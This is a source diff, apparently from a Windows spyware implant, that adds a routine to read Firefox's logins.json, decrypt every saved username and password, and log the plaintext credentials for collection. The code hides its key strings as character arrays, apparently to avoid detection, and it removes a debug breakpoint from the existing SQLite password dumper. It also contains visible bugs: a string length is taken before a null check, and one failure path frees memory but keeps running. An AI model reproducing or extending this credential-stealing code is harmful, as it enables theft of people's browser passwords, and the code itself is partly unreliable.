@@ -10,6 +10,8 @@
 #include "ffox_password.h"
 #include "firefox_cookies.h"
 #include "base64.h"
+#include "JSON.h"
+#include "JSONValue.h"
 
 NSS_Init_p fpNSS_Init = NULL;
 NSS_Shutdown_p fpNSS_Shutdown = NULL;
@@ -115,7 +117,7 @@ VOID DumpFFoxSQLPasswords(LPBYTE *lpBuffer, LPDWORD dwBuffSize)
 		if (sqlite3_exec(lpDb, "SELECT * FROM moz_logins;", ParseFFoxSQLPasswords, &pContainer, &strErr) != SQLITE_OK) // FIXME: char array
 		{
 			OutputDebug(L"[!!] Querying sqlite3 for firefox passwords: %S\n", strErr);
-			__asm int 3;
+			//__asm int 3;
 			zfree(strErr);
 		}
 #else
@@ -125,6 +127,149 @@ VOID DumpFFoxSQLPasswords(LPBYTE *lpBuffer, LPDWORD dwBuffSize)
 	}
 	
 
+	zfree(strFilePath);
+	zfree(strProfilePath);
+}
+
+VOID DumpFFoxJsonPasswords(LPBYTE *lpBuffer, LPDWORD dwBuffSize) 
+{
+	
+	HANDLE hFile, hMap;
+	DWORD loginSize = 0;
+	CHAR *loginMap, *localLoginMap;
+	JSONValue* jValue = NULL;
+	JSONArray  jLogins;
+	JSONObject jObj, jEntry;
+
+	WCHAR strLogins[]       = { L'l', L'o', L'g', L'i', L'n', L's', L'\0' };
+	WCHAR strURL[]          = { L'h', L'o', L's', L't', L'n', L'a', L'm', L'e', L'\0' };
+	WCHAR strUser[]         = { L'e', L'n', L'c', L'r', L'y', L'p', L't', L'e', L'd', L'U', L's', L'e', L'r', L'n', L'a', L'm', L'e', L'\0' };
+	WCHAR strPass[]         = { L'e', L'n', L'c', L'r', L'y', L'p', L't', L'e', L'd', L'P', L'a', L's', L's', L'w', L'o', L'r', L'd', L'\0' };
+	WCHAR strFFox[]         = { L'F', L'i', L'r', L'e', L'f', L'o', L'x', L'\0' };
+	
+	CHAR tmp_buff[255];
+	LPWSTR strUserDecrypted, strPasswordDecrypted;
+	WCHAR strUrl[255];
+
+	LPSTR strProfilePath = GetFirefoxProfilePathA();
+	CHAR strFileName[] = { 'l', 'o', 'g', 'i', 'n', 's', '.', 'j', 's', 'o', 'n', 0x0 };
+	DWORD dwSize = strlen(strProfilePath)+strlen(strFileName) + 2; // terminator + slash
+	LPSTR strFilePath = (LPSTR) zalloc(dwSize);
+	
+	if (!strProfilePath)
+		return;
+	
+	_snprintf_s(strFilePath, dwSize, _TRUNCATE, "%s\\%s", strProfilePath, strFileName);
+
+	/* retrieve file content */
+	if ( (hFile = CreateFileA(strFilePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL)) == INVALID_HANDLE_VALUE )
+	{
+		zfree(strFilePath);
+		zfree(strProfilePath);
+		return;
+	}
+
+	loginSize = GetFileSize(hFile, NULL);
+	if (loginSize == INVALID_FILE_SIZE)
+	{
+		CloseHandle(hFile);
+		zfree(strFilePath);
+		zfree(strProfilePath);
+		return;
+	}
+			
+	localLoginMap = (CHAR*) calloc(loginSize + 1, sizeof(CHAR) );
+	if (localLoginMap == NULL)
+	{
+		CloseHandle(hFile);
+		zfree(strFilePath);
+		zfree(strProfilePath);
+		return;
+	}
+				
+	if ((hMap = CreateFileMappingA(hFile, NULL, PAGE_READONLY, 0, 0, NULL)) == NULL)
+	{
+		zfree(localLoginMap);
+		CloseHandle(hFile);
+		zfree(strFilePath);
+		zfree(strProfilePath);
+		return;
+	}
+
+	if ((loginMap = (CHAR*) MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0)) == NULL )
+	{
+		CloseHandle(hMap);
+		zfree(localLoginMap);
+		CloseHandle(hFile);
+		zfree(strFilePath);
+		zfree(strProfilePath);
+	}
+
+	memcpy_s(localLoginMap, loginSize+1, loginMap, loginSize);
+	UnmapViewOfFile(loginMap);
+	CloseHandle(hMap);
+	CloseHandle(hFile);
+
+	/* we've got file content, parse json */
+	jValue = JSON::Parse(localLoginMap);
+	if (jValue == NULL)
+	{
+		zfree(localLoginMap);
+		zfree(strFilePath);
+		zfree(strProfilePath);
+		return;
+	}
+
+	if (jValue->IsObject())
+	{
+		jObj = jValue->AsObject(); // json root
+
+		/* find logins object */
+		if (jObj.find(strLogins) != jObj.end() && jObj[strLogins]->IsArray())
+		{
+			jLogins = jObj[strLogins]->AsArray();
+
+			for (DWORD i=0; i < jLogins.size(); i++)
+			{
+				if (jLogins[i]->IsObject())
+				{
+					jEntry = jLogins[i]->AsObject();
+
+					if (jEntry.find(strURL)   != jEntry.end() &&
+						jEntry.find(strUser)  != jEntry.end() &&
+						jEntry.find(strPass)  != jEntry.end() &&
+						jEntry[strURL]->IsString()   &&
+						jEntry[strUser]->IsString()  &&
+						jEntry[strPass]->IsString()  )
+					{
+						/* decrypt user, password, Url */
+						_snprintf_s(tmp_buff, 255, _TRUNCATE, "%S", jEntry[strUser]->AsString().c_str());
+						strUserDecrypted = DecryptString(tmp_buff);
+
+						_snprintf_s(tmp_buff, 255, _TRUNCATE, "%S", jEntry[strPass]->AsString().c_str());
+						strPasswordDecrypted = DecryptString(tmp_buff);
+
+						_snwprintf_s(strUrl, 255, _TRUNCATE, L"%s", jEntry[strURL]->AsString().c_str());
+
+						/* log */
+						PasswordLogEntry(strFFox,  strUrl, strUserDecrypted, strPasswordDecrypted, lpBuffer, dwBuffSize);
+
+#ifdef _DEBUG
+						OutputDebug(L"[*] %S> username: %s password: %s Url: %s\n", __FUNCTION__, strUserDecrypted, strPasswordDecrypted, jEntry[strURL]->AsString().c_str() );
+#endif
+						
+						zfree(strUserDecrypted);
+						zfree(strPasswordDecrypted);
+
+					} /* if (jEntry */
+				} /* if (jLogins */
+			} /* for */
+		} /* jObj.find(strLogins) */
+	}
+	
+	/* cleanup */
+	delete jValue;
+	zfree(localLoginMap);
 	zfree(strFilePath);
 	zfree(strProfilePath);
 }
@@ -308,6 +453,7 @@ VOID DumpFFoxPasswords(LPBYTE *lpBuffer, LPDWORD dwBuffSize)
 		if (CopyAndLoadFFoxLibrary())
 		{
 			DumpFFoxSQLPasswords(lpBuffer, dwBuffSize);	
+			DumpFFoxJsonPasswords(lpBuffer, dwBuffSize);	
 			UnloadFirefoxLibs();
 		}
 		zfree(strFFoxPath);
